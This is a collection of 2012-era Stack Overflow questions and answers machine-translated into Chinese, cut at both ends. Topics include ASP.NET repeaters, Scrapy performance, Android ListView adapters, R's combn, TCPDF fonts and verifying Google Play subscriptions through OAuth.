            .FunctionScore(fs => fs
                .Functions(fn => fn
                    .FieldValueFactor(fvf => fvf
                        .Field(f => f.Significance)
                        .Weight(2)
                        .Missing(1)
        ))))
        .Must(m => m
            .Match(ma => ma
                .Field(f => f.MySearchData)
                    .Query(query)
)))) 
```

# asp.net - 具有多个转发器的 ASP.NET MultiView

> ID：12427450
> 
> 赞同：0
> 
> 时间：2012-09-14T15:20:44.877
> 
> 标签：asp.net, repeater, multiview

我有一个问题，我需要你的意见。我有一个带有 MultiView 的控件，每个视图将是控件输出的不同渲染，大约有 10 个不同的视图。在每个视图中，我将有一个重复几行的中继器，这个中继器对于所有视图都是相同的，并且由于 MultiView 只允许在任何时候显示 1 个视图，我虽然有相同 ID 的中继器，所以我不必进行 10 个绑定并使用完全相同的代码创建 10 个 OnItemDataBound 事件，但是 ASP.NET 不允许我拥有具有相同 ID 的转发器（对于这种情况，它应该比那个更聪明）。我正在使用框架的 C# 和 v4。

这是多视图代码：

```
<asp:MultiView id="MultiView" runat="server">

    <asp:View id="h400" runat="server">
        <div class="latest_Wide">
            <h3>Wide</h3>
            <asp:Repeater id="rptLatest" runat="server" OnItemDataBound="rptLatest_OnItemDataBound">
                <ItemTemplate>
                    <p>&bull; <asp:Literal id="litPostTitle1" runat="server" /></p>
                </ItemTemplate>
            </asp:Repeater>
        </div>
    </asp:View>

    <asp:View id="h200" runat="server">
        <div class="latest_Narrow">
            <h3>Narrow</h3>
            <asp:Repeater id="rptLatest" runat="server" OnItemDataBound="rptLatest_OnItemDataBound">
                <ItemTemplate>
                    <p>&bull; <asp:Literal id="litPostTitle2" runat="server" /></p>
                </ItemTemplate>
            </asp:Repeater>
        </div>
    </asp:View>

...

</asp:MultiView> 
```

我怎么解决这个问题。请记住，我不想使用完全相同的代码进行 10 个转发器绑定并拥有 10 个 OnItemDataBound 事件，因为您建议为转发器提供不同的 ID。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:16:38.223

您是否考虑过让中继器成为用户控件？这样，您就可以在用户控件中拥有所有中继器绑定代码。每个视图都有它自己的用户控件实例。

这是你愿意采取的方向吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T17:29:06.857

这不漂亮......但是：

假设您的 ASCX：

```
<asp:MultiView id="mvPostDisplay" runat="server">

    <asp:View id="h400" runat="server">
        <div class="latest_Wide">
            <h3>Wide</h3>
            <asp:Repeater runat="server" OnItemDataBound="rptLatest_OnItemDataBound">
                <ItemTemplate>
                    <p>&bull; <asp:Literal id="litPostTitle1" runat="server" /></p>
                </ItemTemplate>
            </asp:Repeater>
        </div>
    </asp:View>

    <asp:View id="h200" runat="server">
        <div class="latest_Narrow">
            <h3>Narrow</h3>
            <asp:Repeater runat="server" OnItemDataBound="rptLatest_OnItemDataBound">
                <ItemTemplate>
                    <p>&bull; <asp:Literal id="litPostTitle2" runat="server" /></p>
                </ItemTemplate>
            </asp:Repeater>
        </div>
    </asp:View>

...

</asp:MultiView> 
```

在您的代码隐藏中：

```
 private void DataBindRepeater()
    {
        View activeView = this.mvPostDisplay.GetActiveView();
        Repeater myRepeater = this.FindRepeater(activeView);
        if (myRepeater != null)
        {
            myRepeater.DataSource = this.GetDataSourceFormSomewhere();
            myRepeater.DataBind();
        }
    }

    private Repeater FindRepeater(Control container)
    {
        if (container is Repeater)
        {
            return container as Repeater;
        }
        else
        {
            foreach (Control c in container.Controls)
            {
                Repeater retVal = this.FindRepeater(c);
                if (retVal != null)
                {
                    return retVal;
                }
            }

            return null;
        }
    } 
```

`DataBindRepeater`在您确定合适的视图后，只需调用即可。请注意`rptLatest`不会设置，因此您需要在处理程序中使用 , 或可能不那么骇人听闻的东西来获取对中继器的`sender`引用`FindRepeater`。

# python - 如何提高scrapy的下载速度？

> ID：12427451
> 
> 赞同：7
> 
> 时间：2012-09-14T15:20:46.407
> 
> 标签：python, scrapy

我正在使用scrapy从许多不同的域并行下载页面。我有几十万页要下载，所以性能很重要。

不幸的是，当我分析了scrapy的速度时，我每秒只能获得几页。真的，平均每秒大约 2 页。我以前写过我自己的多线程蜘蛛每秒处理数百页——我认为scrapy 使用twisted 等肯定会具有类似的魔力。

如何加快scrapy？我真的很喜欢这个框架，但是这个性能问题对我来说可能是一个交易破坏者。

这是 settings.py 文件的相关部分。我错过了一些重要的设置吗？

```
LOG_ENABLED = False
CONCURRENT_REQUESTS = 100
CONCURRENT_REQUESTS_PER_IP = 8 
```

几个参数：

*   使用scrapy 0.14版
*   该项目部署在 EC2 大型实例上，因此应该有足够的内存、CPU 和带宽可供使用。
*   我正在使用 JSON 协议来安排爬虫，让爬虫在任何给定时间都充满几十个并发爬虫。
*   正如我在开始时所说，我正在从许多站点下载页面，因此远程服务器性能和 CONCURRENT_REQUESTS_PER_IP 不应该是一个问题。
*   目前，我只做很少的后期处理。没有xpath；没有正则表达式；我只是保存每个页面的 url 和一些基本统计信息。（一旦我解决了基本的性能问题，这将在稍后改变。）

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-25T00:43:27.940

过去我遇到过这个问题……而且我用一个“肮脏”的老技巧解决了大部分问题。

[做一个本地缓存 DNS](http://wiki.list.org/display/DOC/Improving+performance+by+local+DNS+caching)。

大多数情况下，当您同时访问远程站点时 CPU 使用率很高，这是因为 scrapy 正在尝试解析 url。

请记住将主机 (/etc/resolv.conf) 上的 dns 设置更改为本地缓存 DNS 服务器。

第一个会很慢，但是一旦它开始缓存并且更有效地解析，您将看到巨大的改进。

我希望这能帮助你解决你的问题！

# c# - 拆分服务器变量 user_logon

> ID：12427455
> 
> 赞同：2
> 
> 时间：2012-09-14T15:21:06.043
> 
> 标签：c#, asp.net

需要拆分服务器变量 user_logon 并删除 domain\ 部分。

目前它返回为 domain\542458

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:24:09.653

```
var numbers = user_logon.Split("\\")[1]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:23:10.520

```
var user = user_logon.Split("\")[1]; 
```

[http://msdn.microsoft.com/en-us/library/system.string.split.aspx](http://msdn.microsoft.com/en-us/library/system.string.split.aspx)

# java - ListView 显示上一次传递的数据以及当前传递的数据

> ID：12427458
> 
> 赞同：-1
> 
> 时间：2012-09-14T15:21:12.497
> 
> 标签：java, android, listview, android-adapterview

我正在处理一个小的“搜索”实现。如果项目与查询匹配，则 listView 会显示这些项目。这很好用，但是每当隐藏并重新显示菜单并进行新查询时，所有“可搜索”都会继续堆积。如果我有 4 个应该显示，首先它会显示 4，然后是 8，然后是 12，等等。

```
private class Adapter extends BaseAdapter {

    private LayoutInflater inflater;

    public Adapter(){
        inflater = LayoutInflater.from(getContext());
    }

    @Override
    public int getCount() {
        return menuItems.size();
    }

    @Override
    public Object getItem(int position) {
        return menuItems.get(position).text;
    }

    @Override
    public long getItemId(int position) {
        return menuItems.get(position).id;
    }

    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        final ViewHolder holder = new ViewHolder(); 
            if (!isSearching) {
                convertView = inflater.inflate(R.layout.rbm_item, null);
            } else {
                convertView = inflater.inflate(R.layout.rbm_search_item, null);                 
            }
            holder.subMenuList = (LinearLayout) convertView.findViewById(R.id.sub_holder);
            holder.text = (TextView) convertView.findViewById(R.id.rbm_item_text);  

            convertView.setTag(holder);
            convertView.setOnClickListener(new OnClickListener() {
                @Override 
                public void onClick(View v) {
                    if (holder.subMenuList.getVisibility() == View.VISIBLE) {
                        holder.subMenuList.setVisibility(View.GONE);
                    } else {
                        holder.subMenuList.setVisibility(View.VISIBLE);
                    }
                }
            });

            if (isSearching) {
                holder.image = (ImageView) convertView.findViewById(R.id.rbm_item_icon);
                holder.image.setImageResource(menuItems.get(position).icon);    
                holder.chapterId = (TextView) convertView.findViewById(R.id.id_text);
                holder.chapterId.setText("Ch"+Integer.toString(menuItems.get(position).id));
            } else {
                holder.chapterId = (TextView) convertView.findViewById(R.id.rbm_item_id);
                holder.chapterId.setText(Integer.toString(menuItems.get(position).id));
            }
            holder.text.setText(menuItems.get(position).text);
            if (!isSearching) {
                for (int i=0;i<menuItems.get(position).subItems.size();i++) {
                    TextView tv = new TextView(ctx);
                    tv.setTextColor(0xFF893658);
                    tv.setText(menuItems.get(position).subItems.get(i).getTitle());
                    tv.setCompoundDrawablesWithIntrinsicBounds(menuItems.get(position).subItems.get(i).getIcon(), 0, 0, 0);
                    tv.setCompoundDrawablePadding(5);
                    if (i == 0) {
                        if (menuItems.get(position).subItems.size() == 1) {
                            tv.setPadding(20, 20, 0, 20);
                        } else{
                            tv.setPadding(20, 20, 0, 10);
                        }
                    } else if (i == menuItems.get(position).subItems.size()-1){
                        tv.setPadding(20, 10, 0, 20);
                    } else {
                        tv.setPadding(20, 10, 0, 10);
                    }
                    holder.subMenuList.addView(tv);
                }
            } 

        return convertView;
    }

    class ViewHolder {
        TextView text;
        ImageView image;
        LinearLayout subMenuList;
        TextView chapterId;
    }           
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:25:29.970

尝试清除 menuItems 中的列表项，然后在进行新查询后重新添加项目。是否尝试清除 menuItems 中的列表项，然后在将新查询设为 arraylist 或其他内容后重新添加项目？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:26:03.710

很难从您发布的内容中确定，但我猜您是将新结果附加到 menuItems 而不是用新数据替换它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T15:30:35.200

我不太了解你的问题。但是只要浏览一下您的代码，我就会发现一个问题

```
if (!isSearching) {
            convertView = inflater.inflate(R.layout.rbm_item, null);
        } else {
            convertView = inflater.inflate(R.layout.rbm_search_item, null);                 
        } 
```

这件作品可能是您的问题的原因。列表适配器的 getView 方法被非常频繁地调用，因此它应该包含最少且不太繁重的操作。

如果您要检查列表适配器的默认示例。您将看到 convertView 已针对 null 进行检查，因此它不需要再次膨胀并再次重复使用，以便更快地准备要在列表中显示的视图。这在您的代码中没有发生。

谷歌关于高效适配器示例 Android。

# entity-framework - 使用 Visual Studio 2012 和 SQL Server Management Studio 2012 运行 SQL Server CE 4 查询

> ID：12427459
> 
> 赞同：3
> 
> 时间：2012-09-14T15:21:12.737
> 
> 标签：entity-framework, sql-server-ce, visual-studio-2012, sql-server-2012

我最近升级到 Visual Studio 2012 和 SQL Server Management Studio 2012，但是我似乎看不到如何在 SQL Server CE 4.0 数据库上执行 SQL 脚本（由实体框架创建）。使用 VS2010 + SSMS 2008，Transact-SQL 编辑器会请求连接，您可以浏览到对象，但是此选项在 SSMS 2012 中不可用。

我试图通过 Server Explorer -> New Query 窗口执行脚本，但我得到了解析错误。有什么线索吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-29T01:44:36.970

微软在SSMS 2012[中取消了它](http://social.msdn.microsoft.com/Forums/en-US/sqltools/thread/d2735d0d-f593-40e5-bf7a-356704c3aaee/)，并建议改用 WebMatrix 中的集成工具（从记忆中，找不到那个链接）。

但是，正如[Microsoft Answers](http://social.msdn.microsoft.com/Forums/en-US/sqltools/thread/d2735d0d-f593-40e5-bf7a-356704c3aaee/)帖子中所建议的，您可以使用[SQL Server Compact Toolbox](http://sqlcetoolbox.codeplex.com/)，它非常有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T16:16:58.583

尝试使用 SQL Server 对象资源管理器而不是服务器资源管理器。这应该允许你做你想做的事。

# c - 使用 .cfg 文件的指针警告

> ID：12427468
> 
> 赞同：2
> 
> 时间：2012-09-14T15:21:34.813
> 
> 标签：c, linux, ubuntu-12.04, libconfig

我尝试使用 libconfig 设置交流程序。有example1.c：

```
int main() 
{   
  const char **channel;

  config_t config;

  config_init(&config);

  config_read_file(&config, "example.cfg");
     if( config_lookup_string(&config,"value.channel",&channel) == CONFIG_FALSE)  
     {
        printf("Failed to read fields\n");
        return 1;  
     }
       printf("argumente = %s\n", (char *)channel);
       return 0; 
} 
```

和 example.cfg 文件

> 价值={频道=“你好”；}

如果我编译它

> **gcc example1.c -lconfig**

它说：

```
example1.c:39:3: Warning: delivery of arguments 3 from »config_lookup_string« of a incompatible pointer
/usr/include/libconfig.h:244:26: Detailed: »const char **« expected, but argument has typ »const char ***« 
```

有趣的是它有效...输出是： **argumente = hello**

我怎样才能摆脱这个警告？

如果我将 decleration 更改为`const char *channel`和 output `printf("argumente = %s\n", channel);`，我会在开始时收到段错误，并在编译时收到警告，例如...`Detailed: »const char **« expected, but argument has typ »const char *«`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:25:24.290

`*`你只需要在你的声明中去掉一个`channel`. 如果这样做，您还可以删除`printf`通话中的演员表。

它现在“工作”的原因是演员隐藏了关于您的`printf`格式的第二个警告。您的程序的行为就像`*`已经删除了多余的一样 - 只是以一种令人困惑的方式。

# cllocation - CLLocation `distanceFromLocation:` 考虑了地球的椭球形状

> ID：12427471
> 
> 赞同：2
> 
> 时间：2012-09-14T15:21:39.667
> 
> 标签：cllocation, cllocationdistance

我似乎在文档描述中看不到它，但是有人知道上述方法是否考虑了地球的椭球形状还是基于球形？

我认为确实如此，我只需要确定！

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2020-11-26T23:45:22.350

是的，似乎`CLLocation.distance(from:)`确实使用*了某种*椭球地球模型。

使用这个 Swift 代码

```
func testRadius(lat1: CLLocationDegrees, lon1: CLLocationDegrees, lat2: CLLocationDegrees, lon2: CLLocationDegrees, angularDistance: CLLocationDegrees) {
    let loc1 = CLLocation(latitude: lat1, longitude: lon1)
    let loc2 = CLLocation(latitude: lat2, longitude: lon2)

    let angularDistanceRadians = angularDistance * .pi / 180
    let meterDistance = loc2.distance(from: loc1)
    let earthRadius = meterDistance / angularDistanceRadians  // assumes circle!

    func coordAsString(_ loc: CLLocation) -> String {
        "(\(loc.coordinate.latitude), \(loc.coordinate.longitude))"
    }

    print(earthRadius, coordAsString(loc1), coordAsString(loc2))
}

// Meridians at longitudes 0°, 90°, 180° and -90°. Poles aren't well-behaved, thus ±89° instead of ±90°
testRadius(lat1: -89, lon1:   0, lat2:  89, lon2:   0, angularDistance: 178)
testRadius(lat1: -89, lon1:  90, lat2:  89, lon2:  90, angularDistance: 178)
testRadius(lat1: -89, lon1: 180, lat2:  89, lon2: 180, angularDistance: 178)
testRadius(lat1: -89, lon1: -90, lat2:  89, lon2: -90, angularDistance: 178)

// Equator from longitudes 0° to 180° and from 90° to -90°
testRadius(lat1:   0, lon1:   0, lat2:   0, lon2: 180, angularDistance: 180)
testRadius(lat1:   0, lon1:  90, lat2:   0, lon2: -90, angularDistance: 180) 
```

你可以沿着一些经线和赤道测试地球的半径。这导致：

```
6367088.045696135 (-89.0, 0.0) (89.0, 0.0)
6367088.045696135 (-89.0, 90.0) (89.0, 90.0)
6367088.045696135 (-89.0, 180.0) (89.0, 180.0)
6367088.045696135 (-89.0, -90.0) (89.0, -90.0)
6378137.000000001 (0.0, 0.0) (0.0, 180.0)
6378137.000000001 (0.0, 90.0) (0.0, -90.0) 
```

所以**赤道半径为 6,378,137 m**，并且——因为我们在这里使用 pi 和弧度而不是椭圆偏心率（我们不知道）特定的“周长因子”—— **“平均纵向”半径约为 6,367,088 m**。

这些与 GPS 中常用的参考椭球[WGS-84 相](https://en.wikipedia.org/wiki/World_Geodetic_System#WGS84)`CoreLocation`匹配，这与用于访问 iPhone 的 GPS 数据的 API一样有意义。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-09-14T15:28:00.830

你读过参考书吗？

> 这种方法通过追踪它们之间的一条遵循地球曲率的线来测量两个位置之间的距离。生成的弧线是一条平滑曲线，没有考虑两个位置之间的特定高度变化。

# character - TCPDF : 使用 FONT "cid0cs" 和 "stsongstdlight" 使汉字加粗

> ID：12427472
> 
> 赞同：0
> 
> 时间：2012-09-14T15:21:39.540
> 
> 标签：character, tcpdf, bold

我已经为汉字使用了“cid0cs”和“stsongstdlight”字体，并且所有字符都正确。以下是汉字：

安吧爸八百北不大的兄弟地东都对多儿二方港哥个关贵国过海好很会家见叫岛姐京九可老李零六吗妈么没美妹们明名哪哪那南你你朋七起千去人认日三上是什生师识十四他她台天湾万王我五西息系先香想小谢姓休学也一亿英友月张再此中字</p>

我想在 PDF 中加粗这个字符。

我用这个： $pdf->SetFont($font, 'BUI', 12);

PDF 中的输出只有下划线，没有粗体和斜体。

我还使用了使用相同字体的英文字符来查看粗体和斜体是否适合它们。但是对于英语以及 BOLD 和 Italic dint 来了。

还：我试过了

`$pdf->writeHTML("<span><b>安吧爸八百北不大岛的弟地东都对多儿二方港哥个关贵国过海好很会</b></span>", true, 0, true, true);`

`$pdf->writeHTML("<span><b>The quick brown fox jumps over the lazy dog</b></span>", true, 0, true, true);`

`$pdf->writeHTML("<i>The quick brown fox jumps over the lazy dog</i>", true, 0, true, true);`

`$pdf->writeHTML("<strong>The quick brown fox jumps over the lazy dog</strong>", true, 0, true, true);`

`$pdf->writeHTML("<span><b>谁什生师识十是四他她台天湾万王我五西息系先香想小谢姓休学也一亿英友月再张这中字&lt;/b></span>", true, 0, true, true);`

但这些都没有给我一个粗体或斜体输出。

可以为 FONT "cid0cs" 和 "stsongstdlight" 做些什么来支持 BOLD 和 Italic。

已附上 PDF 输出的图像（因为找不到附加 pdf 的选项）

![在此处输入图像描述](../Images/3b1099a9c6e59fb5217a3780a8881a07.png)

等待一些有用的答复。

谢谢 ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T15:19:31.817

如果您导入自定义字体，您需要确保包含这些字体的斜体和粗体版本。如果您检查 tcpdf lib 中的字体目录，您会看到每种字体都包含粗体、斜体和粗斜体版本（例如，您有 times、timesb、timesbi 和 timesi）。

# r - R - 将 Combn 函数的结果传递给两个参数函数

> ID：12427476
> 
> 赞同：4
> 
> 时间：2012-09-14T15:21:48.570
> 
> 标签：r

我有一个股票/ETF 符号向量，其大小取决于我的兴趣。

前任：

```
symbols_v <- c('UPRO','TLT','SPXU','TBT','DRN','URE','SOXL') 
```

我想使用组合规则，一次两个迭代向量，生成对。

前任：

```
p <- combn(symbols_v, 2) 
```

然后，p 中的每一对都应传递到（用户定义的）两个参数函数“ `f(x,y)`”，该函数将下载股票数据并执行相关性和其他功能。

我的问题是：1）对于下面的步骤 2，p 使用的最佳数据结构是什么？2) 给定数据结构 p，解析它以将对提供给函数 f 的最简单方法是什么？

摘要：如何获取`combn()`函数的结果并将每一对传递给函数`f(x,y)`？

我试图最小化循环，因为这在 R 中被认为是“慢”的。

我可能遗漏了一些基本的东西，但我似乎无法完全理解它。

请在提供答案时随意侮辱我的智慧:)

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-14T15:38:04.090

您可以只使用以下`FUN`参数`combn`：

```
library(quantmod)  # for getSymbols
symbols_v <- c('UPRO','TLT','SPXU')  # shorter example
# simple function to download data and calculate correlation between close prices
f <- function(x) {
  x1 <- getSymbols(x[1], auto.assign=FALSE)
  x2 <- getSymbols(x[2], auto.assign=FALSE)
  y <- merge(Cl(x1),Cl(x2))
  cor(y[,1],y[,2],use="complete.obs")
}
# run 'f' on each pair 
p <- combn(symbols_v, 2, FUN=f, simplify=FALSE)

[[1]]
            TLT.Close
UPRO.Close -0.6394617

[[2]]
           SPXU.Close
UPRO.Close  0.0947242

[[3]]
           SPXU.Close
TLT.Close -0.06216682 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-14T15:33:41.740

`mapply`似乎是你要找的。它允许您提供一个函数和多个输入 - 然后它将为函数使用每个输入的第一个元素，然后是输入的第二个元素，依此类推。

```
symbols_v <- c('UPRO','TLT','SPXU','TBT','DRN','URE','SOXL')
out <- combn(symbols_v, 2)

# What you would probably want
mapply(f, out[1,], out[2,])

# Example output
mapply(paste, out[1,], out[2,])
# get rid of names
mapply(paste, out[1,], out[2,], USE.NAMES = FALSE)
# add other parameters to function of interest
mapply(paste, out[1,], out[2,], USE.NAMES = FALSE, MoreArgs = list(sep = ".")) 
```

这些示例的输出：

```
> mapply(paste, out[1,], out[2,])
       UPRO        UPRO        UPRO        UPRO        UPRO        UPRO 
 "UPRO TLT" "UPRO SPXU"  "UPRO TBT"  "UPRO DRN"  "UPRO URE" "UPRO SOXL" 
        TLT         TLT         TLT         TLT         TLT        SPXU 
 "TLT SPXU"   "TLT TBT"   "TLT DRN"   "TLT URE"  "TLT SOXL"  "SPXU TBT" 
       SPXU        SPXU        SPXU         TBT         TBT         TBT 
 "SPXU DRN"  "SPXU URE" "SPXU SOXL"   "TBT DRN"   "TBT URE"  "TBT SOXL" 
        DRN         DRN         URE 
  "DRN URE"  "DRN SOXL"  "URE SOXL" 
> # get rid of names
> mapply(paste, out[1,], out[2,], USE.NAMES = FALSE)
 [1] "UPRO TLT"  "UPRO SPXU" "UPRO TBT"  "UPRO DRN"  "UPRO URE"  "UPRO SOXL"
 [7] "TLT SPXU"  "TLT TBT"   "TLT DRN"   "TLT URE"   "TLT SOXL"  "SPXU TBT" 
[13] "SPXU DRN"  "SPXU URE"  "SPXU SOXL" "TBT DRN"   "TBT URE"   "TBT SOXL" 
[19] "DRN URE"   "DRN SOXL"  "URE SOXL" 
> # add other parameters to function of interest
> mapply(paste, out[1,], out[2,], USE.NAMES = FALSE, MoreArgs = list(sep = "."))
 [1] "UPRO.TLT"  "UPRO.SPXU" "UPRO.TBT"  "UPRO.DRN"  "UPRO.URE"  "UPRO.SOXL"
 [7] "TLT.SPXU"  "TLT.TBT"   "TLT.DRN"   "TLT.URE"   "TLT.SOXL"  "SPXU.TBT" 
[13] "SPXU.DRN"  "SPXU.URE"  "SPXU.SOXL" "TBT.DRN"   "TBT.URE"   "TBT.SOXL" 
[19] "DRN.URE"   "DRN.SOXL"  "URE.SOXL" 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T15:28:37.363

您可以使用`apply(combn(symbols_v, 2),2,function(x){f(x[1],x[2])})`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-07-22T13:31:29.090

`combn`还允许将多个参数传递给被调用的函数。第一个参数将被传递

```
fun <- function (x1, x2) someOperation
y <- someData
combn(rnorm(1:10), 2, fun, x2=y) 
```

# jquery - 使用 JQuery 的 fabric.js 和 CMS，与 $ 变量的冲突问题

> ID：12427477
> 
> 赞同：1
> 
> 时间：2012-09-14T15:21:53.830
> 
> 标签：jquery, conflict, fabricjs

我正在尝试将 fabric.js 集成到我为 CMS 制作的产品中。问题是我从织物演示站点基于它的代码在启动所有织物功能/代码的代码上方有这一行：

```
var $ = function(id){return document.getElementById(id)}; 
```

看到 CMS 在后台运行 ajax 代码以获取通知，我得到了这些错误，因为我“偷了”$：

```
TypeError: $(document) is null

TypeError: $.ajaxUpdater is not a function 
```

我已经尝试更改删除该行，很明显这不起作用:)。以上均指CMS的main.js文件。我将 $ 更改为其他内容（尝试了 $$ 和 z）并且错误消失了，但是当我尝试选择画布上的对象时我得到了很多奇怪的行为，并且过滤器不再起作用，所以这不起作用。我已经检查了我是否正确替换了 $ 的每个实例。我还尝试使用 JQuerys noConflict 方法进行试验，但这也不起作用。

我在这里遗漏了一些明显的东西吗？我已经在网上搜索了帮助，但是在 CMS 中找不到任何使用 JQuery 的示例，在这种情况下，强制用户在制作产品时修改核心文件是不好的形式。如果我想从头开始同时使用这两者，我想我知道该怎么做，但是在不修改 CMS 核心 js 代码的情况下这样做是很棘手的。有人有任何提示吗？非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T23:29:03.710

好的，我已经解决了这个问题。我只是从头开始并逐步构建它，而不是深入研究他们的完整示例。我现在所有过滤器都可以正常工作，没有冲突！

# android - 我是否获得了验证用户的 Android 应用内订阅的正确步骤？

> ID：12427479
> 
> 赞同：37
> 
> 时间：2012-09-14T15:21:59.740
> 
> 标签：android, service, google-api, google-play, subscription

我正在制作一个不需要用户帐户/登录并允许用户购买订阅的应用程序。我想使用 Google Play Developer API 来验证用户是否有购买/有效订阅。从所有文档中，我收集了以下步骤。

它们是否正确，你能回答其中的两个问题吗？

1.  在 Google API 控制台中创建一个[服务帐户。](https://developers.google.com/accounts/docs/OAuth2#serviceaccount)
2.  保存给我的私钥（在哪里？肯定不在我的代码中/在设备上，[**如此示例代码**](https://code.google.com/p/google-api-java-client/wiki/OAuth2#Service_Accounts)所示）
3.  使用[适用于 Java 的 Google API 客户端库](https://developers.google.com/accounts/docs/OAuth2ServiceAccount)创建并使用私钥签署 JWT（如何？[**文档给了我这个**](https://developers.google.com/accounts/docs/OAuth2ServiceAccount#jwtcontents)，但那不是 Java 代码......我该怎么处理它？）
4.  构造访问令牌请求，并获取对 API 的访问权限
5.  应用程序现在可以向 API 发送[GET](https://developers.google.com/android-publisher/v1/purchases/get)请求，以查明用户是否有订阅
6.  当访问令牌过期时，返回步骤 3。

另外，我有一个 Web 服务，虽然我对 Web 服务或 Web 服务编程一无所知......我只知道足够了解它可能需要在这里使用。

**编辑：这些步骤不正确。请参阅下面的答案以了解正确的步骤。但是，请注意，这仅适用于使用服务帐户（因为我不想要求用户必须明确允许 API 访问）**

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2012-09-25T20:40:19.657

事实证明，我的步骤不正确。我花了几个星期才弄清楚这一点，而且似乎没有在其他任何地方记录下来。别客气：

1.  [在Google API 控制台](https://code.google.com/apis/console/)中创建一个**Web 应用程序**帐户。将任何网站作为“重定向 URI”；没关系，因为您不会真正使用它。创建帐户时，您将获得一个客户端 ID 和客户端密码。

2.  在计算机上的浏览器中，`https://accounts.google.com/o/oauth2/auth?scope=https://www.googleapis.com/auth/androidpublisher&response_type=code&access_type=offline&redirect_uri=[YOUR REDIRECT URI]&client_id=[YOUR CLIENT ID]`在出现提示时访问并允许访问。

3.  在地址栏中查看。您最初输入的 URI 的末尾将是您的刷新令牌。看起来`1/....`您将在下一步中需要此“代码”。刷新令牌永不过期。

4.  通过转到 ，将此“代码”转换为“刷新令牌” `https://accounts.google.com/o/oauth2/token?client_id=[YOUR CLIENT ID]&client_secret=[YOUR CLIENT SECRET]&code=[CODE FROM PREVIOUS STEP]&grant_type=authorization_code&redirect_uri=[YOUR REDIRECT URI]`。您可以将结果值保存在程序中；除非明确撤销，否则它永远不会过期。（*此步骤由@BrianWhite 插入——见评论*）确保您使用的是 POST。（由 Gintas 插入）

5.  `https://accounts.google.com/o/oauth2/token`在您的代码中，使用 BasicNameValuePairs `"grant_type","refresh_token"`, `"client_id",[YOUR CLIENT ID]`, `"client_secret",[YOUR CLIENT SECRET]`,发送一个 HttpPost 请求`"refresh_token",[YOUR REFRESH TOKEN]`。例如看[这里](http://www.androidsnippets.com/executing-a-http-post-request-with-httpclient)。您将需要在单独的线程中执行此操作，可能使用 AsyncTask。这将返回一个 JSONObject。

6.  从返回的 JSONObject 中获取访问令牌。例如看[这里](https://stackoverflow.com/questions/9605913/how-to-parse-json-in-android)。您将需要获取字符串“access_token”。访问令牌将在 1 小时后过期。

7.  在您的代码中，将 HttpGet 请求发送到`https://www.googleapis.com/androidpublisher/v1/applications/[YOUR APP'S PACKAGE NAME]/subscriptions/[THE ID OF YOUR PUBLISHED SUBSCRIPTION FROM YOUR ANDROID DEVELOPER CONSOLE]/purchases/[THE PURCHASE TOKEN THE USER RECEIVES UPON PURCHASING THE SUBSCRIPTION]?accesstoken="[THE ACCESS TOKEN FROM STEP 4]"`. 例如看[这里](https://stackoverflow.com/questions/10455831/http-get-request-in-android-2-3-3)。

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2017-01-04T00:21:28.750

**.NET 用户：**我希望这个答案可以为某人省去很多悲伤。

正如@Christophe Fondacci 在 2015 年指出的那样，几年前公认的解决方案效果很好。

现在是~~2017~~ *2020 年*，这个过程*变得更加容易和快捷*。

我的用例是验证应用内订阅，我的移动应用将订阅购买信息发送到我的 RESTful 服务器，该服务器反过来联系 Google 以验证订阅购买。

该策略是创建一个代表您操作的服务帐户。

1.  登录到您的[Google Play 开发控制台](https://play.google.com/apps/publish)并单击您正在设置的应用程序。

2.  访问**设置**-> **API 访问**

3.  在**Service Accounts**下，点击**Create Service Account**按钮。

4.  截至 2017 年 1 月，将出现一个对话框，其中包含有关设置服务帐户的说明。该对话框会将您带到 Google API 控制台；从那里，

    A) 单击**创建服务帐户**

    B) 创建有意义的服务帐户名称。由于我们有兴趣访问 Android Publisher Services，因此我选择了“publisher”。

C) 对于角色，只需选择一些内容 - 您可以稍后更改。

D) 选择“提供新的私钥”并为 .Net 实现**选择 P12**。不要丢失此文件！

5.  现在您已完成 #4，您将看到列出的新服务帐户；单击“授予访问权限”以启用它。

6.  点击“查看权限”链接。您应该根据您的需要和 API 修改权限。

要验证应用内购买，请访问 Cog->Change Permissions 并启用全球“可见性”和“管理订单”权限。

好的，此时您已经在 Google 端配置了所有内容。现在将您的服务器设置为服务器的东西。我建议创建一个 .Net 控制台应用程序来测试您的实现，然后在需要的地方卸载它。

1.  从 Nuget ^([1]添加 Android Publisher 客户端库)

```
 PM> Install-Package Google.Apis.AndroidPublisher.v3 
```

2.  将 P12 文件添加到项目根目录

3.  更改 P12 属性，使“构建操作”为“内容”，“复制到输出目录”为“如果较新则复制”。

4.  实现这样的东西来测试你的访问和微调^([1])。

```
 using System.Threading.Tasks;
    using System.Security.Cryptography.X509Certificates;
    using Google.Apis.Services;
    using Google.Apis.Auth.OAuth2;
    using Google.Apis.AndroidPublisher.v3;
    ...
    public Task<SubscriptionPurchase> GetSubscriptionPurchase(string packageName, string productId, string purchaseToken)
    {
        var certificate = new X509Certificate2(
                        "{{your p12 file name}}",
                        "{{ your p12 secret }}",
                        X509KeyStorageFlags.Exportable
                    );
        var credentials = new ServiceAccountCredential(
